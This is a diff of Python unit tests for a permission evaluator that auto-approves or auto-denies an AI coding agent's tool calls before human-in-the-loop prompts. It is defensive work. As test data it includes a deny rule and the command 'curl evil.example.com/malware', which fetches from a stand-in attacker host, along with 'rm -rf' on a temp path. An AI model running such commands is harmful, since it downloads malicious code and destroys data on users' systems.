@@ -1,4 +1,4 @@
-"""Tests for the pre-decide-via-PermissionEvaluator path in ``_handle_pause``.
+"""Tests for the pre-decide-via-PermissionEvaluator path in ``HitlController.handle_pause``.
 
 Agno's ``requires_confirmation`` gate fires HITL for every "ask"-level
 tool, regardless of permission mode. Plan-mode-deny, acceptEdits-allow,
@@ -6,7 +6,7 @@ bypass-allow, and matching ``deny:`` rules were therefore being
 short-circuited by the HITL prompt — the user saw an approval dialog
 for tools the policy had already decided about.
 
-``_handle_pause`` now runs each paused requirement through the
+``handle_pause`` now runs each paused requirement through the
 evaluator first. If the evaluator says DENY/ALLOW the requirement is
 auto-resolved (``req.confirm()`` / ``req.reject()`` called directly)
 and the FE never sees a ``HITLRequest`` for it. These tests pin that
@@ -19,9 +19,9 @@ from unittest.mock import AsyncMock, MagicMock
 
 import pytest
 
+from igni_core.backend.hitl_controller import HitlController
 from igni_core.backend.pending_requirements_store import PendingRequirementsStore
 from igni_core.backend.schemas_pause import PendingRequirement
-from igni_core.backend.server import BackendServer
 from igni_core.core.config.permission_eval import (
     PermissionEvaluator,
     PermissionMode,
@@ -29,14 +29,15 @@ from igni_core.core.config.permission_eval import (
 from igni_core.protocol import messages as msg
 
 
-def _make_backend(evaluator: PermissionEvaluator | None) -> BackendServer:
-    """A BackendServer built via ``__new__`` (skipping ``__init__``)
-    with just enough state for ``_handle_pause`` to run."""
-    server = BackendServer.__new__(BackendServer)
-    server._session = MagicMock()
-    server._session.permission_evaluator = evaluator
-    server._hitl_store = PendingRequirementsStore()
-    return server
+def _make_hitl(
+    evaluator: PermissionEvaluator | None,
+    store: PendingRequirementsStore | None = None,
+) -> HitlController:
+    """A :class:`HitlController` over a session whose only real part is
+    the permission evaluator ``handle_pause`` consults."""
+    session = MagicMock()
+    session.permission_evaluator = evaluator
+    return HitlController(session=session, store=store or PendingRequirementsStore())
 
 
 def _pause_event(reqs: list[MagicMock], run_id: str = "run-1") -> MagicMock:
@@ -61,9 +62,9 @@ class TestNoEvaluator:
     def test_falls_back_to_legacy_behavior(self) -> None:
         # When the session has no evaluator wired up (defensive), every
         # req should go through the normal HITLRequest path.
-        server = _make_backend(evaluator=None)
+        hitl = _make_hitl(evaluator=None)
         req = _req("edit_file", {"file_path": "a.py"})
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
         messages, auto, run_id = _r.messages, _r.auto_resolved, _r.run_id
         assert len(messages) == 1
         assert isinstance(messages[0], msg.RunPaused)
@@ -79,10 +80,10 @@ class TestPlanMode:
         # Plan mode + edit tool → DENY before HITL. The FE should not
         # see a RunPaused at all; the req should be rejected directly.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("edit_file", {"file_path": "a.py", "old_string": "x", "new_string": "y"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, run_id = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -107,10 +108,10 @@ class TestPlanMode:
         # ``read_file``; that toolkit left the registry, so the
         # surviving member of ``FILE_READ_TOOLS`` stands in.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("fetch_url", {"url": "https://example.test"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -124,10 +125,10 @@ class TestPlanMode:
         # trigger a HITL prompt under plan mode — they're how the
         # agent investigates.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("run_shell_command", {"command": "cat src/cli.py"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -140,13 +141,13 @@ class TestPlanMode:
         # block it even though it goes through Bash (the tool the
         # agent will most often try to route around restrictions).
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req(
             "run_shell_command",
             {"command": "sed -i '' '1s/^/# header\\n/' src/cli.py"},
         )
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -158,10 +159,10 @@ class TestPlanMode:
     def test_redirect_bash_auto_rejected(self) -> None:
         # ``> file`` also mutates — must block too.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("run_shell_command", {"command": "echo hi > out.txt"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -174,10 +175,10 @@ class TestPlanMode:
         # ``Edit`` rather than the internal ``edit_file``. Both are
         # in FILE_EDIT_TOOLS so both must be denied.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("Edit", {"file_path": "a.py"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -191,10 +192,10 @@ class TestAcceptEditsMode:
         # acceptEdits + edit tool → ALLOW. No HITL dialog; the tool
         # auto-runs.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.ACCEPT_EDITS)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("edit_file", {"file_path": "a.py"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -207,10 +208,10 @@ class TestAcceptEditsMode:
         # Bash isn't in FILE_EDIT_TOOLS — acceptEdits should NOT
         # auto-allow it (only edits get auto-approved).
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.ACCEPT_EDITS)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("run_shell_command", {"args": ["ls"]})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -222,10 +223,10 @@ class TestAcceptEditsMode:
 class TestBypassMode:
     def test_any_tool_auto_confirmed(self) -> None:
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.BYPASS_PERMISSIONS)
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("run_shell_command", {"args": ["whoami"]})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -241,10 +242,10 @@ class TestBypassMode:
             mode=PermissionMode.BYPASS_PERMISSIONS,
             deny=["Bash(rm *)"],
         )
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("Bash", {"command": "rm -rf /tmp/whatever"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -262,10 +263,10 @@ class TestDefaultModeWithDenyRule:
             mode=PermissionMode.DEFAULT,
             deny=["Bash(curl evil.example.com*)"],
         )
-        server = _make_backend(evaluator=ev)
+        hitl = _make_hitl(evaluator=ev)
         req = _req("Bash", {"command": "curl evil.example.com/malware"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -283,11 +284,12 @@ class TestMixedRequirements:
         # FE should see only the unclassified tool in RunPaused; the
         # rejected edit is returned to the caller for stashing.
         ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
-        server = _make_backend(evaluator=ev)
+        store = PendingRequirementsStore()
+        hitl = _make_hitl(evaluator=ev, store=store)
         edit_req = _req("edit_file", {"file_path": "a.py"})
         custom_req = _req("mcp__weather__forecast", {"city": "Toronto"})
 
-        _r = server._handle_pause(_pause_event([edit_req, custom_req]))
+        _r = hitl.handle_pause(_pause_event([edit_req, custom_req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -303,7 +305,7 @@ class TestMixedRequirements:
         custom_req.confirm.assert_not_called()
         # And the deferred req is stored in the HITL store so the
         # eventual HITLResponseBatch can resolve it.
-        assert len(server._hitl_store.pending_ids()) == 1
+        assert len(store.pending_ids()) == 1
 
 
 class TestEvaluatorExceptionFallsThrough:
@@ -312,10 +314,10 @@ class TestEvaluatorExceptionFallsThrough:
         # Falling back to the user prompt is the safe default.
         evaluator = MagicMock()
         evaluator.evaluate.side_effect = RuntimeError("boom")
-        server = _make_backend(evaluator=evaluator)
+        hitl = _make_hitl(evaluator=evaluator)
         req = _req("edit_file", {"file_path": "a.py"})
 
-        _r = server._handle_pause(_pause_event([req]))
+        _r = hitl.handle_pause(_pause_event([req]))
 
         messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
@@ -332,23 +334,22 @@ class TestResolveHitlBatchMergesAutoResolved:
 
     @pytest.mark.asyncio
     async def test_user_decision_plus_stashed_auto_both_passed(self) -> None:
-        # Build a server with:
+        # Build a controller with:
         #   - one pending req the user will resolve
         #   - one auto-rejected req stashed under the same run_id
-        server = BackendServer.__new__(BackendServer)
-        server._session = MagicMock()
-        server._session.sub_agent_hitl.resolve.return_value = False
-        server._session.session_id = "sess"
-        server._session.hook_executor.execute = AsyncMock(
+        session = MagicMock()
+        session.sub_agent_hitl.resolve.return_value = False
+        session.session_id = "sess"
+        session.hook_executor.execute = AsyncMock(
             return_value=MagicMock(should_continue=True, message="")
         )
 
         user_req = MagicMock(name="user-req", spec=["confirm", "reject"])
         auto_req = MagicMock(name="auto-req", spec=["confirm", "reject"])
         run_id = "run-mixed"
-        server._hitl_store = PendingRequirementsStore()
-        server._hitl_store.register("u1", PendingRequirement(req=user_req, run_id=run_id))
-        server._hitl_store.stash_auto_resolved(run_id, [auto_req])
+        store = PendingRequirementsStore()
+        store.register("u1", PendingRequirement(req=user_req, run_id=run_id))
+        store.stash_auto_resolved(run_id, [auto_req])
 
         # Capture what's passed into acontinue_run.
         async def _empty(*_a, **_kw):
@@ -356,23 +357,23 @@ class TestResolveHitlBatchMergesAutoResolved:
                 yield
             return
 
-        server._session.main_team.acontinue_run = MagicMock(side_effect=_empty)
+        session.main_team.acontinue_run = MagicMock(side_effect=_empty)
 
         async def _passthrough(stream):
             async for _ in stream:
                 yield _
 
-        server._stream_with_subagent_hitl = _passthrough  # type: ignore[assignment]
+        hitl = HitlController(session=session, store=store, stream_factory=_passthrough)
 
         decisions = [msg.HITLDecision(requirement_id="u1", action="confirm", choice="once")]
 
-        async for _ in server.resolve_hitl_batch(decisions):
+        async for _ in hitl.resolve_batch(decisions):
             pass
 
-        server._session.main_team.acontinue_run.assert_called_once()
-        kwargs = server._session.main_team.acontinue_run.call_args.kwargs
+        session.main_team.acontinue_run.assert_called_once()
+        kwargs = session.main_team.acontinue_run.call_args.kwargs
         passed = kwargs.get("requirements") or []
         assert user_req in passed
         assert auto_req in passed
         # The bucket should be drained so we don't re-merge on a later resume.
-        assert server._hitl_store.auto_resolved_snapshot() == {}
+        assert store.auto_resolved_snapshot() == {}
